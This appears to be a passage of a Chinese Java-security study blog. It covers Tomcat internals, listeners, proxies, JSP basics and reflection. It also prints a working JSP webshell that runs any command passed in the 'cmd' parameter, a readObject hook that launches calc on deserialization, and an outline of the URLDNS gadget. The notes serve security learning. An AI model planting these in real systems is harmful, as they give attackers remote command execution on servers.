go&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123; &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/6e2cfed1/20260206154419991.png" alt="image.png"></p>
<h2 id="Listener（观察者）"><a href="#Listener（观察者）" class="headerlink" title="Listener（观察者）"></a>Listener（观察者）</h2><p>Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。<br>这里介绍七个个listener，</p>
<ul>
<li><strong>ServletContextListener</strong>：用于监听 ServletContext 对象的创建和销毁事件，可以在 ServletContext 对象初始化时执行一些初始化代码，也可以在 ServletContext 对象销毁时执行一些清理代码。</li>
<li><strong>ServletContextAttributeListener</strong>：用于监听 ServletContext 对象中属性的添加、删除和替换事件，可以在属性添加时执行一些逻辑处理，比如更新配置信息等；在属性删除时执行一些清理操作，比如释放资源等。</li>
<li><strong>HttpSessionListener</strong>：用于监听 HttpSession 对象的创建和销毁事件，可以在 HttpSession 对象初始化时执行一些初始化代码，也可以在 HttpSession 对象销毁时执行一些清理代码。</li>
<li><strong>HttpSessionAttributeListener</strong>：用于监听 HttpSession 对象中属性的添加、删除和替换事件，可以在属性添加时执行一些逻辑处理，比如更新用户信息等，在属性删除时执行一些清理操作，比如清空数据等。</li>
<li><strong>HttpSessionActivationListener</strong>：用于监听 HttpSession 对象的钝化和活化事件，可以在 HttpSession 对象钝化时执行一些清理操作，比如将 Session 中的数据写入硬盘等，在 HttpSession 对象活化时执行一些初始化代码，比如重新读取数据等。</li>
<li><strong>ServletRequestListener</strong>：用于监听 HttpServletRequest 对象的创建和销毁事件，可以在 HttpServletRequest 对象初始化时执行一些初始化代码，也可以在 HttpServletRequest 对象销毁时执行一些清理代码。</li>
<li><strong>ServletRequestAttributeListener</strong>：用于监听 HttpServletRequest 对象中属性的添加、删除和替换事件，可以在属性添加时执行一些逻辑处理，比如更新请求参数等，在属性删除时执行一些清理操作，比如释放资源等。<br>主要作用就是监听</li>
</ul>
<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="/posts/6e2cfed1/20260206204656675.png" alt="image.png"><br>这张图就是tomcat的工作原理</p>
<h2 id="tomcat的构成"><a href="#tomcat的构成" class="headerlink" title="tomcat的构成"></a>tomcat的构成</h2><p>tomcat包括五大容器和一大连接器，五大容器是Service、Engine、Host、Context、Wrapper、Connector<br><img src="/posts/6e2cfed1/20260206205009097.png" alt="image.png"><br>上图就是tomcat中的几个组件，接下来我们详细的分析一下。</p>
<h3 id="server组件"><a href="#server组件" class="headerlink" title="server组件"></a>server组件</h3><p>server组件在tomcat最外层，所以可以将server实例看成一个tomcat，server实例启动后，会立马对端口进行监听（默认端口是8005）。要注意的是一个server实例只能监听一个端口，这个组件的作用就是对全局进行管理。</p>
<h3 id="service组件"><a href="#service组件" class="headerlink" title="service组件"></a>service组件</h3><p>service组件关联着Connector和Engine组件，它负责接受和处理客户端的请求，以及将这些请求传递给Engine组件进行进一步的处理。简单来说，Service组件是Tomcat中对外提供服务的核心组件。（也可以看上上图的红字部分，web服务器是不处理请求的）。</p>
<h3 id="Engine组件"><a href="#Engine组件" class="headerlink" title="Engine组件"></a>Engine组件</h3><p>上个组件也提到了，Engine组件就是负责处理客户端的请求，并对这些请求分发到对应的Host和web应用程序（context）进行处理。</p>
<h3 id="Host组件"><a href="#Host组件" class="headerlink" title="Host组件"></a>Host组件</h3><p>作用就是当Engine组件接收到来自Connector的请求之后，它会根据请求的主机头信息将请求分发到对应的Host组件。Host组件在进行进一步的处理请求，将其发送到正确的Context（web应用程序）进行处理</p>
<h3 id="Context组件"><a href="#Context组件" class="headerlink" title="Context组件"></a>Context组件</h3><ol>
<li><strong>管理Servlet实例</strong>：Context组件负责管理和维护Servlet实例的生命周期，包括Servlet的装载、初始化、执行和资源回收等。</li>
<li><strong>提供Web应用环境</strong>：Context组件为Web应用提供了运行所需的环境和资源，包括ClassLoader、资源访问对象等。</li>
<li><strong>处理HTTP请求</strong>：当Connector组件接收到HTTP请求后，会通过匹配请求URI的上下文路径来选择相应的Context来处理该请求。然后，Context会根据web.xml文件中定义的servlet映射来选择一个正确的Servlet来处理该请求。</li>
</ol>
<h3 id="wrapper组件"><a href="#wrapper组件" class="headerlink" title="wrapper组件"></a>wrapper组件</h3><p>wrapper组件直接包装了Servlet实例，每个Wrapper组件都对应着一个特定的Servlet，并负责该Servlet的加载、初始化、执行以及资源回收等生命周期管理。</p>
<h3 id="Connector组件"><a href="#Connector组件" class="headerlink" title="Connector组件"></a>Connector组件</h3><p>主要负责客户端连接和客户端请求的处理加工。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>从一个客户端发送一个简单的请求过来，Connector接收到这个请求会把这个请求翻译成各个组件都能看懂得一个状态，然后回把这请求发送给engine组件，Engine组件对其进行简单得处理之后发送到host组件，host组件在对其进一步处理后发送给Context组件（web应用程序）进行处理，给出响应，大概就是这么一个过程。</p>
<h2 id="Tomcat的类加载机制"><a href="#Tomcat的类加载机制" class="headerlink" title="Tomcat的类加载机制"></a>Tomcat的类加载机制</h2><p>在tomcat的类加载机制中，为了保证WebApp的隔离，独立。所以打破了双亲委派机制。每个webapp用一个独有的ClassLoader实例来加载。它首先尝试自己加载，找不到在去找父类，目的是优先加载web应用自己定义的类。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2022/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-01-%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/">Java内存马系列-01-基础内容学习 | Drunkbaby’s Blog</a><br><a href="https://juejin.cn/post/7254792170162552892">Listener监听器什么是 Listener？ Listener ，监听器，是 Servlet 规范中一种组件，用于监 - 掘金</a></p>
<p><a href="https://blog.csdn.net/wang200536/article/details/142900833">Tomcat详细讲解(巨详细！！！)-CSDN博客</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>java内存马</category>
      </categories>
  </entry>
  <entry>
    <title>java动态代理</title>
    <url>/posts/bcee6ab6/</url>
    <content><![CDATA[<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><h3 id="静态代理概念"><a href="#静态代理概念" class="headerlink" title="静态代理概念"></a>静态代理概念</h3><p>在Java编程中，<strong>静态代理</strong>是一种设计模式，它允许通过一个代理类来控制对一个对象的访问。</p>
<h3 id="静态代理实现"><a href="#静态代理实现" class="headerlink" title="静态代理实现"></a>静态代理实现</h3><p>先提供一个接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex2.www;</span><br><span class="line"></span><br><span class="line">//定义一个接口</span><br><span class="line">public interface IUser &#123;</span><br><span class="line">    void show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接口的一个实现类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex2.www;</span><br><span class="line"></span><br><span class="line">//实现接口的具体类</span><br><span class="line">public class Usermpl implements IUser &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void show() &#123;</span><br><span class="line">        System.out.println(&quot;show&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是一个代理类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex2.www;</span><br><span class="line"></span><br><span class="line">public class UserProxy implements IUser &#123;</span><br><span class="line">    IUser user; //使用接口数据类型</span><br><span class="line">    public UserProxy(IUser user) &#123;</span><br><span class="line">        this.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void show() &#123;</span><br><span class="line">        user.show();</span><br><span class="line">        System.out.println(&quot;调用了show&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是测试类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex2.www;</span><br><span class="line"></span><br><span class="line">//主类使用接口类型引用具体实现</span><br><span class="line">public class ProxyTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">    IUser user = new Usermpl();</span><br><span class="line">    //user.show();</span><br><span class="line">        IUser userProxy = new UserProxy(user);</span><br><span class="line">        userProxy.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><h3 id="动态代理概念"><a href="#动态代理概念" class="headerlink" title="动态代理概念"></a>动态代理概念</h3><p>动态代理是一种在运行时创建代理对象的技术，它允许在不修改原始代码的情况下增强方法的功能</p>
<h3 id="动态代理实现"><a href="#动态代理实现" class="headerlink" title="动态代理实现"></a>动态代理实现</h3><p>提供一个接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex3.www;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">public interface IUser &#123;</span><br><span class="line">   public void show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接口的实现类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex3.www;</span><br><span class="line"></span><br><span class="line">public class UserImpl implements IUser &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void show() &#123;</span><br><span class="line">        System.out.println(&quot;show&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来要使用的方法是Proxy.newProxyInstance，我们看一下他的参数</p>
<p><img src="/posts/bcee6ab6/1756436008057-85ea819c-b856-448e-b2a5-fc4acc9b0995.png" alt="img"></p>
<p>1.类加载器，2.接口，3.调用处理器</p>
<p>然后我们需要一个处理器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex3.www;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class UserinvationHandler implements InvocationHandler &#123;</span><br><span class="line">    IUser user;</span><br><span class="line"></span><br><span class="line">    public UserinvationHandler(IUser user) &#123;</span><br><span class="line">        this.user = user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">        method.invoke(user, args); //相当于获取一个show方法，给到了method，利用反射调用的是user的method方法</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接口是InvocationHandler而他只有一个方法就是invoke，对其进行一个重写，利用反射去调用一个方法。</p>
<p>测试类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex3.www;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">public class ProxyTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        IUser user = new UserImpl();</span><br><span class="line">        InvocationHandler userinvationhandler = new UserinvationHandler(user); //传入一个对象，也就是user</span><br><span class="line"></span><br><span class="line">        IUser iUser = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),</span><br><span class="line">                user.getClass().getInterfaces(),</span><br><span class="line">                userinvationhandler);</span><br><span class="line">        iUser.show(); //调用show，也是传输show（个人理解）</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写了好理解一点</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>java基础</category>
      </categories>
  </entry>
  <entry>
    <title>java内存马_2</title>
    <url>/posts/f725af6b/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天是内存马和jsp的基础知识</p>
<h1 id="JSP基础"><a href="#JSP基础" class="headerlink" title="JSP基础"></a>JSP基础</h1><h2 id="什么是JSP"><a href="#什么是JSP" class="headerlink" title="什么是JSP"></a>什么是JSP</h2><p>JSP全称Java Server Pages，是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。标签通常以&lt;%开头以%&gt;结束。</p>
<p>JSP是一种Java servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p>
<p>JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p>
<p>JSP标签有多种功能，比如访问数据库、记录用户选择信息、访问JavaBeans组件等，还可以在不同的网页中传递控制信息和共享信息。</p>
<h2 id="JSP环境"><a href="#JSP环境" class="headerlink" title="JSP环境"></a>JSP环境</h2><p>我直接用上次测试Servlet用的就可以了。<br>具体的搭建方法：<br><img src="/posts/f725af6b/20260207172924484.png" alt="image.png"><br>应该是这么选，然后在编辑配置里加个tomcat，在配置好工件，这样就可以了<br><img src="/posts/f725af6b/20260207173027755.png" alt="image.png"><br>从这个目录结构中可以看到，java（自己创建的）文件夹可以存放我们的Servlet和Filter，webapp下存放的是index.jsp<br>注意点：<br><img src="/posts/f725af6b/20260207174235189.png" alt="image.png"><br>这一块要加上tomcat，否则接下来用println的时候回出现无法解析的问题</p>
<h2 id="JSP的语法"><a href="#JSP的语法" class="headerlink" title="JSP的语法"></a>JSP的语法</h2><p>JSP的代码结构：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;% 代码片段 %&gt;</span><br></pre></td></tr></table></figure>
<p>具体的例子是这样的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;  </span><br><span class="line">&lt;% out.println(<span class="string">&quot;hshybb&quot;</span>); %&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/f725af6b/20260207174352783.png" alt="image.png"></p>
<h3 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h3><p>声明使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%! 声明 %&gt;</span><br></pre></td></tr></table></figure>
<p>等价于的XML语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:declaration</span>&gt;</span>   </span><br><span class="line">代码片段</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:declaration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;  </span><br><span class="line">&lt;%! <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;hshybb&quot;</span>; %&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">    out.println(s);  </span><br><span class="line">    out.println(s);  </span><br><span class="line">%&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/f725af6b/20260207180644969.png" alt="image.png"><br>直接在脚本里也可以声明</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;  </span><br><span class="line">&lt;%! <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;hshybb&quot;</span>; %&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="type">String</span> <span class="variable">q</span> <span class="operator">=</span> <span class="string">&quot;1234&quot;</span>;  </span><br><span class="line">    out.println(q);    out.println(s);  </span><br><span class="line">%&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h3><p>结构：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%= %&gt;</span><br></pre></td></tr></table></figure>
<p>xml形式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;jsp:expression&gt;   表达式&lt;/jsp:expression&gt;</span><br></pre></td></tr></table></figure>
<p>实列</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;  </span><br><span class="line">&lt;%! <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;hshybb&quot;</span>; %&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="type">String</span> <span class="variable">q</span> <span class="operator">=</span> <span class="string">&quot;1234&quot;</span>;  </span><br><span class="line">    out.println(q);    out.println(s);  </span><br><span class="line">%&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;p&gt;&lt;%  </span><br><span class="line">    <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;hshybb&quot;</span>;  </span><br><span class="line">%&gt;username:&lt;%=a%&gt;&lt;/p&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/f725af6b/20260207181238885.png" alt="image.png"></p>
<h3 id="JSP注释"><a href="#JSP注释" class="headerlink" title="JSP注释"></a>JSP注释</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%-- 注释内容 --%&gt;</span><br></pre></td></tr></table></figure>
<h3 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h3><p>jsp的三种指令<br><img src="/posts/f725af6b/20260207181557168.png" alt="image.png"></p>
<h3 id="JSP隐式对象"><a href="#JSP隐式对象" class="headerlink" title="JSP隐式对象"></a>JSP隐式对象</h3><p>JSP隐式对象是JSP容器为每个页面提供的Java对象，开发者可以直接使用它们而不用显式声明。JSP隐式对象也被称为预定义变量。</p>
<p>JSP所支持的九大隐式对象：<br><img src="/posts/f725af6b/20260207181851045.png" alt="image.png"></p>
<ol>
<li>request对象：获取HTTp头信息</li>
<li>response对象：提供客户端响应</li>
<li>out对象：输出内容到HTML中</li>
<li>session对象：用来保存用户信息</li>
<li>application对象：所有用户共享信息</li>
<li>config对象：Servlet配置对象，用于Servlet和页面的初始化参数</li>
<li>pageContext对象：JSP的页面容器，用于访问page、request、application和session的属性</li>
<li>page对象：类似于java类的this关键字，表示当前JSP页面</li>
<li>exception对象：该对象用于处理JSP文件执行时发生的错误和异常；只有在JSP页面的page指令中指定isErrorPage的取值true时，才可以在本页面使用exception对象。</li>
</ol>
<h1 id="传统内存马"><a href="#传统内存马" class="headerlink" title="传统内存马"></a>传统内存马</h1><p>接下来开始内存马的学习，先来看一下传统的内存马是什么样子的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/f725af6b/20260207183611908.png" alt="image.png"><br>但是这个内存马是没有回显的，这里在提供一个有回显的内存马</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;  </span><br><span class="line">        <span class="comment">//获取命令执行后输出的数据流  </span></span><br><span class="line">       java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span>  Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();  </span><br><span class="line">       <span class="comment">//创建一个容器（相当于一个桶来接流）  </span></span><br><span class="line">       <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line">       <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];  </span><br><span class="line">       <span class="comment">//只要还有流就不断循环输出string  </span></span><br><span class="line">       <span class="keyword">while</span>((c = in.read(b))!=-<span class="number">1</span>)&#123;  </span><br><span class="line">           out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;%&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/f725af6b/20260207185532851.png" alt="image.png"></p>
<h1 id="Tomcat的三种context"><a href="#Tomcat的三种context" class="headerlink" title="Tomcat的三种context"></a>Tomcat的三种context</h1><h2 id="context"><a href="#context" class="headerlink" title="context"></a>context</h2><p>首先来介绍一下，什么是context？context的翻译就是上下文的意思，可以看一下Drunkbaby大佬的博客里讲的一个例子，这样方便我们理解。<br>作用：在一次web请求的过程中，context会记录当前的情形，比如会记录有什么servlet，有几个Filter，有什么listener，请求的路径，请求的参数等等。</p>
<h2 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h2><p>ServletContext是Servlet规范中规定的ServletContext接口，一般Servlet都要实现这个接口。<br>主要的功能：</p>
<ol>
<li>共享数据</li>
<li>允许访问资源文件</li>
<li>获取初始化参数</li>
<li>设置全局上下文属性</li>
<li>获取web应用程序信息</li>
<li>获取文件路径</li>
<li>获取资源路径</li>
</ol>
<h2 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h2><p>在Tomcat，ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等</p>
<h2 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h2><p>讲这个Context，我们直接先把师傅的图放这里（从总的角度说一下，应该就理解了）<br><img src="/posts/f725af6b/20260207192454520.png" alt="image.png"></p>
<p>实际上对资源的各种操作是调用了StandardContext中的方法。</p>
<p>总的说一下：ServletContext的实现类是ApplicationContextFacade类（也就是ApplicationContext的门面类，有它才能进行ApplicationContext里的操作）。在ApplicationContext中，我们对context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，和我们上面说的一样，StandardContext是Tomcat中负责与底层交互的Context。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/">Java内存马系列-02-内存马介绍 | Drunkbaby’s Blog</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>java内存马</category>
      </categories>
  </entry>
  <entry>
    <title>java反射</title>
    <url>/posts/e29c8e30/</url>
    <content><![CDATA[<h2 id="java反射概念"><a href="#java反射概念" class="headerlink" title="java反射概念"></a>java反射概念</h2><p>Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。</p>
<h2 id="java反射基本用法"><a href="#java反射基本用法" class="headerlink" title="java反射基本用法"></a>java反射基本用法</h2><p>Person类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex.www;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Person implements Serializable &#123;</span><br><span class="line">    private transient String name;</span><br><span class="line">    private int age;</span><br><span class="line">    public Person() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public Person(String name, int age) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;Person&#123;&quot;+</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, age=&quot; + age +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String action(String action) &#123;</span><br><span class="line">        System.out.println(action);</span><br><span class="line">        return action;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>reflectionTest类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex.www;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class reflectionTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Person person = new Person();</span><br><span class="line">        Class c = person.getClass(); //获取类的元数据对象</span><br><span class="line"></span><br><span class="line">        //使用反射机制，实例化对象</span><br><span class="line">        Constructor personconstroctor = c.getConstructor(String.class,int.class); //通过反射机制获取Person类中接收一个String参数和一个int参数的public构造方法的引用（获取构造方法）</span><br><span class="line">        Person p = (Person) personconstroctor.newInstance(&quot;abc&quot;,25); //实例化成一个对象</span><br><span class="line">        System.out.println(p);</span><br><span class="line"></span><br><span class="line">        //使用反射机制，获取类里面的属性</span><br><span class="line">        Field[] personfields = c.getDeclaredFields();</span><br><span class="line">        for (Field f : personfields) &#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125; //循环打印属性</span><br><span class="line">        Field nameField = c.getDeclaredField(&quot;name&quot;); //从原型(类的元数据对象)里获取一个属性</span><br><span class="line">        nameField.setAccessible(true); //允许更改（无论是privated，还是protected）</span><br><span class="line">        nameField.set(p,&quot;ssss&quot;);  //更改对象的值</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        //使用反射机制，调用类里面的方法</span><br><span class="line">        Method[] personmethods = c.getDeclaredMethods(); //</span><br><span class="line">        for (Method m : personmethods) &#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Method nameMethod = c.getDeclaredMethod(&quot;action&quot;, String.class);</span><br><span class="line">        nameMethod.setAccessible(true);</span><br><span class="line">        nameMethod.invoke(p, &quot;abc&quot;); //调用action方法传入参数为abc</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>全在注释里面哦</p>
<h2 id="反射的应用"><a href="#反射的应用" class="headerlink" title="反射的应用"></a>反射的应用</h2><p>一个简单的使用，一个关于dns的。</p>
<p>也就是使用hashmap作为一个入口调用url对象下的hashcode函数</p>
<p><img src="/posts/e29c8e30/1756355936386-7953f54e-4234-45f1-a2e1-c95d4d43dcd1.png" alt="img"></p>
<p>继续跟进</p>
<p><img src="/posts/e29c8e30/1756355959737-1419bd0b-1505-4584-9d20-d99748e346d0.png" alt="img"></p>
<p>做了一个DNS。</p>
<p>但是我们肯定要向hashmap投入一个键值，所以要使用到put</p>
<p><img src="/posts/e29c8e30/1756356122943-e00322f0-a44a-461e-9a7a-0a638be43892.png" alt="img"></p>
<p>我们跟进put</p>
<p><img src="/posts/e29c8e30/1756356146368-dfba32ba-7bc8-4986-8ded-3b5301666e4a.png" alt="img"></p>
<p>跟进hash方法</p>
<p><img src="/posts/e29c8e30/1756356170810-2c8d515e-591a-4a21-8cea-363d4306c2f2.png" alt="img"></p>
<p>发现这里调用了一个hashcode,</p>
<p><img src="/posts/e29c8e30/1756356361647-da6f31df-d593-4a14-ac55-d0a91c9daed0.png" alt="img"></p>
<p>由于初值是-1所以put的时候就会出现一次dns的解析</p>
<p>最后返回的是hashCode，然后我们序列化之后就不是-1了，所以反序列化时就不会进行dns解析了。</p>
<p>根据以上，我们需要第一次不进行dns解析，同时要让反序列化时，进行DNS，因此我们要使用反射机制，进行更改。</p>
<p><img src="/posts/e29c8e30/1756356602651-fa5f4e56-3886-4c62-b498-f276715b462c.png" alt="img"></p>
<p>这样即可。注意点setaccessible方法在17版本是不可用的了，要使用别的方法进行更改私有属性，或者对改一下jdk版本</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>java基础</category>
      </categories>
  </entry>
  <entry>
    <title>moectf2025_第23关</title>
    <url>/posts/3dd769b8/</url>
    <content><![CDATA[<h1 id="moectf-2025-第23关"><a href="#moectf-2025-第23关" class="headerlink" title="moectf 2025 第23关"></a>moectf 2025 第23关</h1><h2 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h2><p>直接给出exp吧，挺有意思的，感觉写的没问题（但是没反弹成功），本地的calc，也正常执行了（虽然反序列化前会执行一次）</p>
